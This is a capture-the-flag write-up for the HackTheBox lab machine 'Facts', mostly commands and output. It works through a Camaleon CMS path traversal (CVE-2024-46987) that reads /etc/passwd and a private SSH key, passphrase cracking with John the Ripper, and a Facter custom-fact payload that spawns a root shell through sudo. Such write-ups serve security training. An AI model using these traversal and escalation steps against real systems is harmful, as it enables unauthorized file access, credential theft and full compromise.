# HackTheBox: Facts

* **Machine Name:** Facts
* **Difficulty:** Easy
* **OS:** Linux
* **Season:**: 10
---

# HackTheBox: Facts (Easy)

**Reconnaissance**

Port scanning and service version detection using `nmap`:

```bash
╭─░▒▓    ~/htb/facts                                                   
╰─ nmap -sV -sC -T4 10.129.9.6 
                                               
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-05 19:27 +0000  
Nmap scan report for 10.129.9.6  
Host is up (0.10s latency).  
Not shown: 998 closed tcp ports (reset)  
PORT   STATE SERVICE VERSION  
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:    
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)  
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)  
80/tcp open  http    nginx 1.26.3 (Ubuntu)  
|_http-title: Did not follow redirect to http://facts.htb/  
|_http-server-header: nginx/1.26.3 (Ubuntu)  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

The scan revealed two open ports: 22 (SSH) and 80 (HTTP). The web server performs a redirect to the domain `facts.htb`. We add an entry to `/etc/hosts`:

```bash
╭─░▒▓    ~/htb/facts                                                
╰─ echo '10.129.9.6  facts.htb' >> /etc/hosts                                                                        
╭─░▒▓    ~/htb/facts  
╰─ cat /etc/hosts                                                                                  
127.0.0.1       localhost  
127.0.1.1       raine.raine     raine  
# The following lines are desirable for IPv6 capable hosts  
::1     localhost ip6-localhost ip6-loopback  
ff02::1 ip6-allnodes  
ff02::2 ip6-allrouters  
10.129.9.6  facts.htb

```


**Web Enumeration**

The site `http://facts.htb` is an entertainment resource with interesting facts. We perform directory and file fuzzing using the `ffuf` utility:

```bash
╭─░▒▓    ~/htb/facts    
╰─ ffuf -u 'http://facts.htb/FUZZ' -w /usr/share/wordlists/dirb/common.txt \
-fs 11100-11190                                                     
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://facts.htb/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/dirb/common.txt  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response size: 11100-11190  
________________________________________________  
  
400        [Status: 200, Size: 6685, Words: 993, Lines: 115, Duration: 1531ms]  
404        [Status: 200, Size: 4836, Words: 832, Lines: 115, Duration: 1433ms]  
500        [Status: 200, Size: 7918, Words: 1035, Lines: 115, Duration: 1535ms]  
admin       [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1530ms]

```

We discover an interesting directory `/admin`, which redirects us to `/admin/login`. The page contains a login form; by following the link at the bottom, we can also register. After registering a new user and logging in, we gain access to the admin panel.

<img width="403" height="602" alt="admin_login" src="https://github.com/user-attachments/assets/2511d641-9a87-481a-ac4f-07904a697b71" />

At the bottom of the interface, we learn which CMS the site is running on and its version: **Camaleon CMS 2.9.0**.

**Exploitation (CVE-2024-46987)**

For this CMS version, we find a Path Traversal vulnerability (CVE-2024-46987). According to the technical description of the exploit on GitHub ([https://github.com/Goultarde/CVE-2024-46987](https://github.com/Goultarde/CVE-2024-46987)), despite the stated vulnerable version range (< 2.8.2), the attack vector remains applicable to version 2.9.0 as well.  
You can learn more about this vulnerability here → [https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c](https://github.com/owen2345/camaleon-cms/security/advisories/GHSA-cp65-5m9r-vc2c)

Using the exploit  
`http://facts.htb/admin/media/download_private_file?file=../../../../../../etc/passwd`  
allowed us to download `/etc/passwd` from the target machine and read its contents:

<img width="333" height="181" alt="download_passwd" src="https://github.com/user-attachments/assets/15065fee-4ea5-4893-aebf-e76c0b7a3f4e" />

```bash
╭─░▒▓    ~/htb/facts  
╰─ cat /home/raine/Downloads/passwd                                                                                  
root:x:0:0:root:/root:/bin/bash  
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin  
bin:x:2:2:bin:/bin:/usr/sbin/nologin  
sys:x:3:3:sys:/dev:/usr/sbin/nologin  
sync:x:4:65534:sync:/bin:/bin/sync  
games:x:5:60:games:/usr/games:/usr/sbin/nologin  
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin  
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin  
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin  
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin  
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin  
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin  
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin  
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin  
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin  
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin  
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin  
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin  
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin  
usbmux:x:100:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin  
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin  
messagebus:x:102:102::/nonexistent:/usr/sbin/nologin  
systemd-resolve:x:992:992:systemd Resolver:/:/usr/sbin/nologin  
pollinate:x:103:1::/var/cache/pollinate:/bin/false  
polkitd:x:991:991:User for polkitd:/:/usr/sbin/nologin  
syslog:x:104:104::/nonexistent:/usr/sbin/nologin  
uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin  
tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin  
tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false  
landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin  
fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin  
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin  
trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash  
william:x:1001:1001::/home/william:/bin/bash  
_laurel:x:101:988::/var/log/laurel:/bin/false

```

We find two target users: `trivia` and `william`.
Using this vulnerability (LFI), we obtain the contents of the **user flag**.  

<img width="885" height="267" alt="user" src="https://github.com/user-attachments/assets/a06aa641-d1d5-4e32-a282-33d18d9c3ade" />

**SSH Access**

Further file enumeration with `ffuf` allowed us to discover the private SSH key of user `trivia`, which is a misconfiguration, since we can read private keys of other users as `www-data`.

```bash
╭─░▒▓    ~/htb/facts   
╰─ ffuf -u 'http://facts.htb/admin/media/download_private_file
file=../../../../../../home/trivia/.ssh/FUZZ' \ 
-H 'Cookie: _factsapp_session=LIJN4lOL%2FRWlqh4lofDvcMrcjNIyuesv%2FJzFnOZtzWHRXvgmdfchaPXpyHx8%2FtYbZved5JiATvaCw1Qp7SbBZURVwJJmpwVR05gyfZJpdnbkO  
6R0EQl%2FIdnEAkHed%2FeYCKWKiuGaxoJg4tjyA24sSRbnP4XMWvRB5Uqb%2BrU2XAjRuOl%2BT%2FaYwmLS%2BNJcZmD3%2BfbRvAvpMExjuR0FumvpGnVufscRRJ1AA0BJUsmVwAEE4YBC  
l9SsrgHztqSqUks5L1qsCToZq3OjhrX11jvO22U6oNYpN9dCTvDPuPts5vy1vWLHdg2M1skxchsGsQCHmL6LolY6iXrV2YE5%2FSJcADW452rTjIdYmvQQfwEuUFxo38FBgWoLnxM%3D--%2B  
HaDUupO1j0mD%2FoM--tafxVD4m3zQKZ%2BcrwLRojA%3D%3D; auth_token=HEdV0SsDn2ATzvBGJqshzw&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+AppleWebKit%2F537.36  
+%28KHTML%2C+like+Gecko%29+Chrome%2F144.0.0.0+Safari%2F537.36&10.10.14.226' -w /usr/share/wordlists/ssh-priv-key-loot-medium.txt \  
-fs 7918  
  
       /'___\  /'___\           /'___\          
      /\ \__/ /\ \__/  __  __  /\ \__/          
      \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\         
       \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/         
        \ \_\   \ \_\  \ \____/  \ \_\          
         \/_/    \/_/   \/___/    \/_/          
  
      v2.1.0-dev  
________________________________________________  
  
:: Method           : GET  
:: URL              : http://facts.htb/admin/media/download_private_file?file=../../../../../../home/trivia/.ssh/FUZZ  
:: Wordlist         : FUZZ: /usr/share/wordlists/ssh-priv-key-loot-medium.txt  
:: Header           : Cookie: _factsapp_session=LIJN4lOL%2FRWlqh4lofDvcMrcjNIyuesv%2FJzFnOZtzWHRXvgmdfchaPXpyHx8%2FtYbZved5JiATvaCw1Qp7SbBZURVwJ  
JmpwVR05gyfZJpdnbkO6R0EQl%2FIdnEAkHed%2FeYCKWKiuGaxoJg4tjyA24sSRbnP4XMWvRB5Uqb%2BrU2XAjRuOl%2BT%2FaYwmLS%2BNJcZmD3%2BfbRvAvpMExjuR0FumvpGnVufscRR  
J1AA0BJUsmVwAEE4YBCl9SsrgHztqSqUks5L1qsCToZq3OjhrX11jvO22U6oNYpN9dCTvDPuPts5vy1vWLHdg2M1skxchsGsQCHmL6LolY6iXrV2YE5%2FSJcADW452rTjIdYmvQQfwEuUFxo  
38FBgWoLnxM%3D--%2BHaDUupO1j0mD%2FoM--tafxVD4m3zQKZ%2BcrwLRojA%3D%3D; auth_token=HEdV0SsDn2ATzvBGJqshzw&Mozilla%2F5.0+%28X11%3B+Linux+x86_64%29+A  
ppleWebKit%2F537.36+%28KHTML%2C+like+Gecko%29+Chrome%2F144.0.0.0+Safari%2F537.36&10.10.14.226  
:: Follow redirects : false  
:: Calibration      : false  
:: Timeout          : 10  
:: Threads          : 40  
:: Matcher          : Response status: 200-299,301,302,307,401,403,405,500  
:: Filter           : Response size: 7918  
________________________________________________  
  
id_ed25519       [Status: 200, Size: 464, Words: 7, Lines: 9, Duration: 1227ms]

```

When fuzzing, don’t forget to specify your `_factsapp_session` and `auth_token`.

```bash
╭─░▒▓    ~/htb/facts  
╰─ cat /home/raine/Downloads/id_ed25519                                                                                  
-----BEGIN OPENSSH PRIVATE KEY-----  
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDVBSx9Dr  
n9VcqNJvouE0wqAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIHDKxrPaDDNjaBE1  
4ttwH0wbVY9N1reRYKbW+cijB4ibAAAAoGdmGlRyVGkRYwaFiE6cwhTs6hIkI9ihhngrtH  
gOwFN7vcsVJiMuksTnH6mqDxxSP3oJD1jh2+9OhTB57txiXFb/vsBJjsLzIp3oaFgoIMlr  
+xK6xFhf2m+yx5w/E5OBWT2Gg2a3wMakOu33v35ZA51IwOoMfQ68oMQv6QyGLvo2WzZTIn  
G/c5iuu1m/j624rBN1Kpxz6acZ/dX4g43xPmE=  
-----END OPENSSH PRIVATE KEY-----

```

The key is protected with a passphrase. To obtain it, I used the `John the Ripper` utility:

```bash
╭─░▒▓    ~/htb/facts   
╰─ ssh2john /home/raine/Downloads/id_ed25519 > rsa.txt 

╭─░▒▓    ~/htb/facts  
╰─ john --wordlist=/usr/share/wordlists/passwords/rockyou.txt rsa.txt 

Using default input encoding: UTF-8  
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])  
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes  
Cost 2 (iteration count) is 24 for all loaded hashes  
Will run 16 OpenMP threads  
Press 'q' or Ctrl-C to abort, almost any other key for status  
dragonballz      (/home/raine/Downloads/id_ed25519)        
1g 0:00:00:41 DONE (2026-02-05 20:04) 0.02424g/s 77.59p/s 77.59c/s 77.59C/s adriano..imissu  
Use the "--show" option to display all of the cracked passwords reliably  
Session completed.

```

We successfully logged into the system via SSH as user `trivia`!

**Privilege Escalation**

Analysis of sudo permissions showed the available commands for the current user:

```bash
trivia@facts:~$ sudo -l  
Matching Defaults entries for trivia on facts:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty  
  
User trivia may run the following commands on facts:  
   (ALL) NOPASSWD: /usr/bin/facter
```

The user can run `/usr/bin/facter` as root without a password.

**Facter** is a system information gathering utility written in Ruby. The `--custom-dir` flag allows specifying a directory to load custom facts (scripts).

The privilege escalation vector involves creating a malicious Ruby script that spawns a system shell and running it via sudo.

```bash
trivia@facts:~$ mkdir /tmp/custom && cd /tmp/  
trivia@facts:/tmp$ echo "Facter.add('x') { setcode { exec '/bin/sh' } }" \ 
> ./custom/custom.rb  
trivia@facts:/tmp$ sudo facter --custom-dir=/tmp/custom/

```

And we obtained **root** privileges:

```
# id  
uid=0(root) gid=0(root) groups=0(root)  
# cat /root/root.txt  
002579b93b92a74c739da93c161863b2

```


---
